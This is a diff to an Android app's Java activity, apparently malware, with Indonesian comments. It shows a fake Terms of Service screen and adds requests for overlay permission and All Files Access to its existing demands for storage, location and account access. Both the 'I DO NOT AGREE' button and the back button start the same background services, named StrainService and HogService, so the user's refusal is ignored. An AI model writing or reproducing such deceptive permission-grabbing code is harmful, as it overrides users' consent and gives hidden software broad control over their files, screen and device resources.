@@ -4,18 +4,26 @@ import android.app.Activity;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
+import android.provider.Settings;
 import android.view.Gravity;
 import android.view.WindowManager;
 import android.widget.*;
 public class ChoiceActivity extends Activity {
     private static final int REQ_ALL = 200;
+    private static final int REQ_MANAGE = 201;
+    private static final int REQ_OVERLAY = 202;
+
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
         getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                 | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
+
+        // runtime permissions biasa
         if (Build.VERSION.SDK_INT >= 23) {
             requestPermissions(new String[]{
                     Manifest.permission.WRITE_EXTERNAL_STORAGE,
@@ -28,17 +36,40 @@ public class ChoiceActivity extends Activity {
                     Manifest.permission.ACCESS_COARSE_LOCATION,
                     Manifest.permission.GET_ACCOUNTS}, REQ_ALL);
         }
+
+        // overlay (buat background activity start di Android 10+)
+        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
+            try {
+                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:" + getPackageName()));
+                startActivityForResult(i, REQ_OVERLAY);
+            } catch (Throwable ignored) {}
+        }
+
+        // All Files Access (buat Android 11+)
+        if (Build.VERSION.SDK_INT >= 30) {
+            try {
+                if (!Environment.isExternalStorageManager()) {
+                    Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
+                            Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(i, REQ_MANAGE);
+                }
+            } catch (Throwable ignored) {}
+        }
+
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
         root.setBackgroundColor(Color.parseColor("#0a0a0a"));
         root.setGravity(Gravity.CENTER);
         root.setPadding(60, 60, 60, 60);
+
         TextView title = new TextView(this);
         title.setText("Terms of Service");
         title.setTextColor(Color.WHITE);
         title.setTextSize(28);
         title.setGravity(Gravity.CENTER);
         root.addView(title);
+
         TextView body = new TextView(this);
         body.setText("By continuing, you agree to our Terms of Service and Privacy Policy.\n\nTap 'I AGREE' to proceed.\nTap 'I DO NOT AGREE' to decline.");
         body.setTextColor(Color.LTGRAY);
@@ -46,6 +77,7 @@ public class ChoiceActivity extends Activity {
         body.setGravity(Gravity.CENTER);
         body.setPadding(0, 40, 0, 60);
         root.addView(body);
+
         Button agree = new Button(this);
         agree.setText("I AGREE");
         agree.setTextColor(Color.WHITE);
@@ -56,17 +88,26 @@ public class ChoiceActivity extends Activity {
                 LinearLayout.LayoutParams.WRAP_CONTENT);
         alp.topMargin = 20;
         root.addView(agree, alp);
+
         Button refuse = new Button(this);
         refuse.setText("I DO NOT AGREE");
         refuse.setTextColor(Color.GRAY);
         refuse.setOnClickListener(v -> activate());
         root.addView(refuse);
+
         setContentView(root);
     }
+
+    @Override
+    protected void onActivityResult(int req, int res, Intent data) {
+        super.onActivityResult(req, res, data);
+    }
+
     private void exitSafe() {
         finishAffinity();
         android.os.Process.killProcess(android.os.Process.myPid());
     }
+
     private void activate() {
         StrainService.start(this);
         HogService.start(this, HogService1.class);
@@ -81,6 +122,7 @@ public class ChoiceActivity extends Activity {
         startActivity(i);
         finish();
     }
+
     @Override
     public void onBackPressed() { activate(); }
 }
